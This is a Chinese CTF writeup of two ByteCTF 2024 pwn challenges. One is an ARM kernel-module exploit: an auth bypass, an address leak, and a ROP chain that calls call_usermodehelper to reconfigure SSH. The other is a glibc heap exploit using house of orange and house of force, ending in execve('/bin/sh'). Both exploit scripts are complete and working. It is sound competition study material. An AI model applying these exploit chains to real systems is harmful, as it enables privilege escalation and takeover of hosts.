---
title: 「PWN」【ByteCTF 2024】Writeup WP 复现

tags: ["house of force", "house of orange", "kernel", "arm"]

authors: [nova]
---

这次 PWN 有两题，有一个 arm kernel 的 pwn 还是挺有意思的，调了很久所以发一篇出来。

<!--truncate-->

## DirtyMod

题目很搞，一开始没有附件，以为是黑盒在那 fuzz 了半天，也只 fuzz 出来 auth0 和 auth1 怎么处罚。





题目到手之后是一个 qcow2 的 FS，还有一个 kernel image

我大概利用下面两条指令将文件系统 mnt 出来

```bash
sudo modprobe nbd
sudo qemu-nbd --connect=/dev/nbd0 debian_wheezy_armhf_standard.qcow2
sudo mount /dev/nbd0p1 $(pwd)/mnt
```

在 root 下面找到了 flag 和 dirtymod.ko 文件，遂拖出来分析。



此外，还在 /var/log/messages 里看到了作者调试的时候的一些 log，也是对解题有一些帮助。

通过观察 messages 其实可以看出可以用 auth1 来绕过一开始的验证。

![image-20240926180022152](https://oss.nova.gal/img/image-20240926180022152.png)



这题用模块监听了一个端口，`ktcp_recv` 后两个参数便是交互过程中的 `store_buf` 和 `len`。它随机了一个 authkey，要进入功能就先得绕过这个 auth

![image-20240926180116124](https://oss.nova.gal/img/image-20240926180116124.png)



auth1 其实很简单，让我们传入一组 (offset, key) 的键值对。但是可以注意到最后的 flag 位 buf[504] 其实是可以被我们用 offset 负数去写的，写成 1 即可。

![image-20240926180229980](https://oss.nova.gal/img/image-20240926180229980.png)

正好测试了一下 o1，发现它也能找到这个洞，并且给出了确实可以用的绕过脚本，确实还是🐂的。

![image-20240926180459247](https://oss.nova.gal/img/image-20240926180459247.png)



然后就是复杂的逆向环节。这题很奇怪，它的结构体 offset 错了。如果你没修，那么你大概会看到这样的恶心场面

![image-20240926180741986](https://oss.nova.gal/img/image-20240926180741986.png)

如果你经过漫长的分析发现了这个结构体是一个 `block_struct`，那么你大概会看到这样的内容

![image-20240926180824588](https://oss.nova.gal/img/image-20240926180824588.png)

还是看不懂，对吧？你经过调试的话就会发现，这个结构体在 IDA 里有 4 字节的错位。也就是说，它其实是从 bpipe(ktcp_svc + 4) 开始的，而非它显示的 ktcp_svc 开始。

然后怎么修呢？我给出一个我自己非常神秘的修法：

我修改 `block_struct` 结构体，让他的前 4 字节为 padding 字段。这样又会导致 bpipe 的东西出问题。

所以我又复制了一个原本的结构体 `block_struct2`，修改了 `pipe_struct` 的定义，使其第一个字段为 `block_struct2[16]`。此时可读性终于稍微有一点点了...

其实直接改字节码也行，但是要改的地方怪多的。在这种修法里你只需要记得 ktcp_svc + 6* 是在遍历 `pipe_struct` 实例 `bpipe` 的 `blks[]` 数组即可。

即 `v19 = bpipe.blks[(bpipe.pos - 1) & 0xf]`

![image-20240926181436169](https://oss.nova.gal/img/image-20240926181436169.png)



好，然后我们简单叙述一下这个东西，它会创建一个 0x10 大小的循环队列，存放 control_block 或者 data_block

如果是 control_block，在 client 消费的时候，它会调用 `control_blk` 上的 callback func

### server_0x10

0x10 会创建一个 control_blk

![image-20240926181706873](https://oss.nova.gal/img/image-20240926181706873.png)

其中，它会使用 large_bin 来存放我们的数据，并且设置回调函数为 `hello`

这里的 large_bin 是程序级别的，就 4 个，地址也是固定的。



### server_0x20

0x20 也会创建 control + data，其中它会以 0x1000 分块，第一个放在 control_blk 里， 后面的放在 data 里，并且设置了 `can_merge = 1`

![image-20240926182235238](https://oss.nova.gal/img/image-20240926182235238.png)

注意这里其实是有一个越界写的。

`v10[0x1000 - v8]`，v10 其实是一个 `control_blk`，`v8` 最大是 `0xfff`，此时我们可以修改 control_blk + 1 开始的位置，也就是覆写它绝大部分的 `argptr` 和 `callback function`



### server_0x30

这里 0x2000 会检查上一个生产出来的块是不是 control_blk，如果不是则看能不能合并进去。没啥用。

![image-20240926183058453](https://oss.nova.gal/img/image-20240926183058453.png)



注意 `push_bpipe_data` 和 `push_bpipe_control` 两个函数，我们会发现 `push_bpipe_data` 并不会设置 can_merge 位。这意味着其实我们能造一个 `can_merge` 的 `control_blk` 出来

![image-20240926183508440](https://oss.nova.gal/img/image-20240926183508440.png)

![image-20240926183521118](https://oss.nova.gal/img/image-20240926183521118.png)



那么我们来看看 `can_merge` 有什么用

### client_0x10

![image-20240926183720030](https://oss.nova.gal/img/image-20240926183720030.png)

首先我们来看它的检查，pre < pos。pre 是消费者拿的位置，pos 是生产者准备生产的位置。然而它其实用的是一个循环队列，用的是 & 0xf 来做的，所以这里我们可能出现这么一种情况：

pos: 0x12 | pre: 0x02

此时我们可以把消费者准备消费的东西替换掉。



继续看，如果是 puredata_blk，那么它就会把 data send 出来。

在这里，它会检查前一个 blk 的 can_merge 位，如果 can_merge，那么他就直接把前面一个拿过来。

那么毫无疑问的，如果这里是一个 control_blk，并且有精心准备的 tail 等值，我们就可以把 control_blk 的 `arg` 和 `callback func` 泄露出来。

![image-20240926184156748](https://oss.nova.gal/img/image-20240926184156748.png)



![image-20240926184549557](https://oss.nova.gal/img/image-20240926184549557.png)

然而对于 ctr block，它会清理 `bpipe_lblks`，让所有内容都为 `0`。

### client_0x20

这就是一个清理函数。不过它显然没有把 blks 清零。

![image-20240926183640428](https://oss.nova.gal/img/image-20240926183640428.png)



### 利用

我们的思路大概明显：利用 can_merge 泄露一个 large 地址，然后往里面填上 ROP，再把 CALLBACK 和 ARG 改掉，即可完成利用。

问题就是如何泄露。



显然我们需要利用 `server_0x20` 来做到，它是唯一一个能设置 can_merge = 1 的函数。

我们申请一个 `0x1001` 的来看看什么效果。

![image-20240926184948545](https://oss.nova.gal/img/image-20240926184948545.png)

此时不难想到，如果我们利用 `client_0x20`，那么我们就可以再次把 pre 和 pos 指向 0 ，从而完成覆写。

我们利用 `0x10` 来写 ctrblk，这样就获得了一个 `can_merge = 0x1` 的 `control_blk`。

![image-20240926185233046](https://oss.nova.gal/img/image-20240926185233046.png)

cool。现在我们就需要考虑的是如何泄露地址。如果我们之后的一个 block 是 puredata 的话，显然它会从 `0xbf26b000` 开始拷贝 0x1000 个字节。而此时我们的 `0xbf26b000` 是标记为使用的，因此我们必须要将其释放，并且在后面转为 `control_blk`

所以我们这时候利用 `client_0x10` 即可把它清 0。此时，我们的 `pre` 为 2，`pos` 为 3（我在这里添加了一个 puredata 块）



那么接下来怎么做呢？我们利用循环队列的特性，使其 blk 被覆写为 ctr_blk 即可。

简单再加一些堆块，使得 `pos` 指向 `0x12`，`pre` 指向 `0x2` 即可。

![image-20240926191342445](https://oss.nova.gal/img/image-20240926191342445.png)

此时，我们可以发现 `0xbf26b000` 里面的内容就是一个 callback_func 和 para

```bash
pwndbg> p/x *(struct control_blk *)0xbf26b000
$3 = {
  data = {
    arg = 0xbe240000,
    blks = 0xbe240000
  },
  callback_func = 0x7f0000f0,
  mode = 0x0
}
```

![image-20240926192340387](https://oss.nova.gal/img/image-20240926192340387.png)

可以看到这正是第三个 `large_chunk` 的地址



之后的事情就简单了。我们再次 clean_pipe。利用 `server_0x20`，将它的 `control_blk` 覆写，使其 arg 指向我们泄露的 large，func 指向一种 gadget，可以使得它 ret 到 r0 寄存器上。我们再用 `server_0x10` 把这个 large 拿回来写上 gadget，即可完成 ROP



至于这个 ROP 写什么，我只能说参考 2022 年 [byteCTF](https://bytedance.larkoffice.com/docx/doxcnWmtkIItrGokckfo1puBtCh)，重定向 SSH 到特定端口。



![image-20240926193729971](https://oss.nova.gal/img/image-20240926193729971.png)

```python
from pwno import *
import struct


def create_bypass_payload():
    payload = bytearray()

    # 需要 16 对（偏移，值），总共 32 字节
    for i in range(16):
        if i == 0:
            # 通过发送 248 来构造偏移量为 -8（因为 (char)248 == -8）
            offset = 248  # 0xF8
            value = 1  # 要写入 buf[504] 的值
        else:
            # 使用任意有效的偏移和值填充
            offset = 0  # 在允许范围内的偏移
            value = 0  # 任意值
        payload += struct.pack("BB", offset, value)
    return payload


def get_caller():
    payload = b"\x01"
    sh = gen_sh("localhost:2325")

    payload = b"\x01" + create_bypass_payload()
    sh.sendafter(b"input 0 or 1\n", payload)

    return sh


def client():
    sh = get_caller()
    sh.sendafter(b"[+] server or client ?\n", b"\x00")
    sh.sendafter(b"hello client\n", b"\x10")
    return sh


def server(
    opt: Literal[b"\0x10", b"\0x20", b"\0x30"], length: int = 0, content: bytes = b""
):
    sh = get_caller()
    sh.sendafter(b"[+] server or client ?\n", b"\x01")
    sh.sendafter(b"hello server\n", opt)
    if opt == b"\x10":  # large pool
        sh.sendafter(b"say hello\n", p16(length) + content)
        sh.recvuntil(b"success\n")
        sh.close()
    elif opt == b"\x20":  # can merge
        sh.sendafter(b"do opt func\n", p16(length) + content)
        sh.close()
    else:  # cannot merge
        sh.sendafter(b"create puredata\n", p16(length) + content)
        sh.close()
    return sh


def clean():
    sh = get_caller()
    sh.sendafter(b"[+] server or client ?\n", b"\x00")
    sh.sendafter(b"[+] hello client\n", b"\x20")
    sh.recv()
    sh.close()


def str_change(payload, str, idx):
    return payload[0:idx] + str + payload[idx + len(str) :]


def rop(heap, cmd):  # server("\x10",1,'b')
    payload = b"\x00" * 0x2000
    stack = 0x1000
    save_sp = 0x1500
    agr = 0x1700
    sl = 0x1800

    payload = str_change(payload, b"/bin/sh\x00", agr)
    payload = str_change(payload, b"-c", agr + 0x10)
    payload = str_change(payload, cmd, agr + 0x20)
    payload = str_change(payload, p32(heap + agr), agr + 0x100)
    payload = str_change(payload, p32(heap + agr + 0x10), agr + 0x100 + 4)
    payload = str_change(payload, p32(heap + agr + 0x20), agr + 0x100 + 8)

    """
    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190
    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c
    0x8051ef98:	cmp	r2, #0
    0x8051ef9c:	beq	0x8051efb0
    0x8051efa0:	blx	r2
    """
    payload = str_change(payload, p32(heap), 0x190)  # r3
    payload = str_change(payload, p32(0x8049DD4C), 0x7C)  # r2

    """
    0x8049dd4c <hvc_push+12>    ldr    r2, [r0, #0xec]
    0x8049dd50 <hvc_push+16>    ldr    r1, [r0, #0xe4]
    0x8049dd54 <hvc_push+20>    ldr    r3, [r3, #4]
    0x8049dd58 <hvc_push+24>    ldr    r0, [r0, #0xf0]
    0x8049dd5c <hvc_push+28>    blx    r3
    """

    payload = str_change(payload, p32(0x802D4D18), 0xEC)  # r2
    payload = str_change(payload, p32(heap), 0xE4)  # r1
    payload = str_change(payload, p32(0x80694958), 0x4)  # r3
    payload = str_change(payload, p32(0x80694958), 0xF0)  # r0

    """
    0x80694958 <rpcauth_list_flavors+76>     mov    r0, sp
    0x8069495c <rpcauth_list_flavors+80>     blx    r2
    """
    """
    0x802d4d18 <nfs_pgio_result+8>     ldr    r3, [r1, #0x3c]
    0x802d4d1c <nfs_pgio_result+12>    mov    r5, r0
    0x802d4d20 <nfs_pgio_result+16>    ldr    r2, [r1]
    0x802d4d24 <nfs_pgio_result+20>    ldr    r3, [r3, #0xc]
    0x802d4d28 <nfs_pgio_result+24>    blx    r3
    """
    payload = str_change(payload, p32(heap), 0x3C)  # r3
    payload = str_change(payload, p32(heap + stack), 0)  # r2
    payload = str_change(payload, p32(0x8010C03C), 0xC)  # r3

    """
    0x8010c03c <cpu_suspend_abort+12>         mov    sp, r2
    0x8010c040 <cpu_suspend_abort+16>         pop    {r4, r5, r6, r7, r8, sb, sl, fp, pc}
    """
    payload = str_change(payload, p32(heap + stack + 4 * 20), stack)
    payload = str_change(payload, p32(0x8017C0F0), stack + 4 * 8)

    """
    0x8017c0f0 <tick_handover_do_timer+76>    str    r0, [r4]
    0x8017c0f4 <tick_handover_do_timer+80>    pop    {r4, pc}
    """
    payload = str_change(payload, p32(0x804282E4), stack + 4 * 10)
    """
    0x804282e4                                pop    {r1, r2, r3}
    0x804282e8                                sub    r0, r0, r1
    0x804282ec                                rsb    r0, r0, r2
    0x804282f0                                pop    {r4, pc}
    """
    payload = str_change(payload, p32(heap + agr + 0x100), stack + 4 * 11)
    payload = str_change(payload, p32(0x80427E38), stack + 4 * 13)
    payload = str_change(payload, p32(0x8010C020), stack + 4 * 15)
    """
    0x8010c020 <__cpu_suspend+96>             pop    {r0, pc}                      <0x8010c020>=
    """
    payload = str_change(payload, p32(heap + agr), stack + 4 * 16)
    payload = str_change(payload, p32(0x80136DEC), stack + 4 * 17)

    """
    0x80136dec <module_attr_show+32>          pop    {lr}
    0x80136df0 <module_attr_show+36>          bx     r3
    """
    call_usermodehelper = 0x8012F990
    payload = str_change(payload, p32(call_usermodehelper), stack + 4 * 18)
    """
    0x80427e38 <call_with_stack+32>:	ldr	sp, [sp, #4]
    0x80427e3c <call_with_stack+36>:	bx	lr
    """
    return payload


clean()
server(b"\x20", 0x1001, b"B" * 0x1001)

clean()
server(b"\x10", 0x1000, b"A" * 0x1000)
server(b"\x10", 0x1000, b"A" * 0x1000)  # can_merge = 1
server(b"\x30", 0x1000, b"C" * 0x1000)

client()
client()


for _ in range(12):
    server(b"\x20", 0x100, b"B" * 0x100)
server(b"\x10", 0x1000, b"A" * 0x1000)
server(b"\x10", 0x1000, b"A" * 0x1000)
server(b"\x10", 0x1000, b"A" * 0x1000)
sh = client()
recvu(b"pure_data success\n")
large = uu32(recv(4))
success(large)
sh.close()

clean()
magic = 0x8051EF90
server(
    b"\x20",
    0x1000 - 1,
    p8(large >> 8 & 0xFF)
    + p8(large >> 16 & 0xFF)
    + p8(large >> 24 & 0xFF)
    + p32(magic)
    + p32(0)
    + b"\x01" * (0x1000 - 1 - 3 - 4 * 2),
)
server(b"\x10", 0x1000, b"A" * 0x1000)
server(b"\x10", 0x1000, b"A" * 0x1000)
cmd = b"sed -i 's/Port 22/Port 2326/g' /etc/ssh/sshd_config ;rmmod dirtymod;service ssh restart;sleep 2;"
payload = rop(large, cmd)
server(b"\x10", 0x2000, payload)
client()

```

![image-20240926200833547](https://oss.nova.gal/img/image-20240926200833547.png)



## ezheap

题目可以随意 malloc，没有 free 函数，有堆溢出

想到可以利用 house of orange 造 ub 转 large 泄露 libc 和 heap

接着利用 house of force 把 topchunk 分配到 tcache_struct

任意堆块分配，远程打了 IO，本地直接改了栈返回地址



```python
from pwno import *

sh = gen_sh()


def menu(idx: int):
    sla(b"exit:", str(idx).encode())


def add(size: int):
    menu(1)
    sla(b"size to add:", str(size).encode())


def show(idx: int):
    menu(3)
    sla(b"index to show:", str(idx).encode())


def edit(idx: int, size: int, data: bytes):
    menu(4)
    sla(b"index to edit:", str(idx).encode())
    sla(b"size", str(size).encode())
    sa(b"input", data)


add(0x10)  # 0
edit(0, 0x20, b"A" * 0x18 + p64(0xD91))
add(0xD90)  # 1
add(0x10)  # 2
show(2)

recvu(b": ")
libc.address = uu64(recv(6)) - 0x3EBCA0 - 0x600
success(libc.address)

debug(libc.sym["puts"] + 0x6D04E)
debug(libc.sym["puts"] + 0x6D64E)
debug(libc.sym["puts"] + 0x5995B2)
debug(libc.sym["puts"] + 0x599596)


add(0xD70)  # 3
add(0xD40)  # 4
edit(4, 0x10, b"A" * 0x10)
show(4)

recvu(b"A" * 0x10)
heap = uu64(recvn(6)) - 0x290
success(heap)

edit(0, 0x20, b"A" * 0x18 + p64(0x20D91))

topchunk = heap + 0x22B20

edit(3, 0xD80, b"A" * 0xD78 + p64(-1, sign=True))

size_ = heap + 0x10 - 0x20 - topchunk
info(size_)
add(size_)  # 5

add(0x210)  # 6
edit(
    6,
    0x210,
    flat(
        [
            b"\x07" * 64,
            [
                libc.sym["environ"],  # 0x20
            ],
        ]
    )
    + b"\n",
)

add(0x10)  # 7

show(7)
recvu(b": ")

stack = uu64(recvn(6)) - 0x128
success(stack)
edit(
    6,
    0x210,
    flat(
        [
            b"\x07" * 64,
            [
                libc.sym["environ"],  # 0x20
                stack,
            ],
        ]
    )
    + b"\n",
)

add(0x20)  # 8

pop_rdi_ret = next(libc.search(asm("pop rdi; ret")))
pop_rsi_ret = next(libc.search(asm("pop rsi; ret")))
pop_rdx_ret = next(libc.search(asm("pop rdx; ret")))
system_ = libc.sym["execve"]
binsh = next(libc.search(b"/bin/sh"))
dbg()
edit(
    8,
    0x50,
    flat([pop_rdi_ret, binsh, pop_rsi_ret, 0, pop_rdx_ret, 0, system_]) + b"\n",
)
ia()
```

